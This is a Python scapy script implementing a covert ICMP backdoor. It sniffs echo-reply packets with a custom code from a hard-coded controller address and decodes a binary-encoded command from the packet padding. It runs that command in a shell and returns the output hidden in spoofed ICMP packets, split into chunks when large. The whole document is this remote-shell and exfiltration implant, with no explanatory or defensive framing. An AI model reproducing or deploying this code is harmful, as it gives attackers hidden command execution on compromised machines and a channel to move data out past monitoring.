import sys, subprocess, random, time
from scapy.all import *
from os import system

# 1472 Bytes is max payload size before fragmentation occurs


global msgCnt, sourceIP, destination

sourceIP = sys.argv[1]
destination = sys.argv[2]


def tx(command,length):
    time.sleep(2)
    bitLength = len(command)
    print('About to send:  ', command)
    print('Destination & source:  ', destination, ' ', sourceIP)
    if bitLength < 1472:
        target = IP(dst=destination, src=sourceIP, id=(random.randint(1,256)))/ICMP(type=0, code=7)/Padding(command)
        send(target)
    else:
        divisor = 2
        while bitLength % 8 != 0:
            command = "0"+str(command)
            bitLength = len(str(command))
        while ((bitLength / divisor) >= 1472) or ((bitLength % divisor) != 0):
            divisor = divisor + 2
        target = IP(dst=destination, src=sourceIP, id=(random.randint(1,256)))/ICMP(type=0, code=6, id=divisor)/Padding('10101010101101000010101')
        send(target)
        increment = bitLength / divisor
        print('Divisor, bitLength, and increment:  ',divisor,' ',bitLength, increment)
        start = 0
        end = int(increment)
        time.sleep(2)
        while end <=bitLength:
            print('Start and end:  ',start,' ',end)
            target = IP(dst=destination, src=sourceIP, id=(random.randint(1,256)))/ICMP(type=0, code=7)/Padding(str(command)[int(start):int(end)])
            send(target)
            start = start + increment
            end = end + increment
            time.sleep(3)

        



def rx():
    
    
    def strip_packet(packet):
        id = packet[ICMP].id
        code = packet[ICMP].code

        if packet[IP].src != '192.168.0.1':
            rx()
        elif packet[ICMP].type in [0, 'echo-reply']:
            if code == 7:
                messageByteLike = packet[Padding].load
                message = messageByteLike.decode()
                strippedMessage = message.rstrip("\x00")
                length = len(strippedMessage)
                while length % 8 != 0:
                    strippedMessage = "0"+str(strippedMessage)
                    length = len(str(strippedMessage))
                    print(length)
                command = bin_decode(strippedMessage)
                print('Command:  ', command)

                if '!HISS!' in command:
                    print('EXITING')
                    exit()

                output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
                cleanOutput = (output.stdout).decode()
                print("Cleaned output:  ", cleanOutput)
                tx(bin_encode(cleanOutput), 1)
                

    msgCnt = 0
    print('Listening')
    sniff(filter = 'icmp', prn=strip_packet,count=1)


def bin_encode(command):
    values = []
    binary = []
    for char in command:
        values.append(ord(char))
    for value in values:
        bits = str(bin(value)[2:])
        length = len(bits)
        while length < 8:
            bits = "0"+bits
            length = len(bits)
        binary.append(bits)
    value = join_bin(binary)
    return str(value)


def bin_decode(output):
    length = len(output)
    numBytes = length/8
    counter = 0
    byteList = []
    charList = []
    start = 0
    end = 8

    while counter < length:
        byteSection = output[start:end]
        byteList.append(byteSection)
        start = start + 8
        end = end + 8
        counter += 1
    
    
    for value in byteList:
        if value != '':
            baseTwoVal = int(value, 2)
            char = chr(baseTwoVal)
            charList.append(char)
    
    message = "".join(charList)
    return message





def join_bin(list):
    if len(list) != 0:
        string = [str(i) for i in list]
        returnVal = int("".join(string))
    else:
        returnVal = 0
     
    return(returnVal)

        
   


while True:
    rx()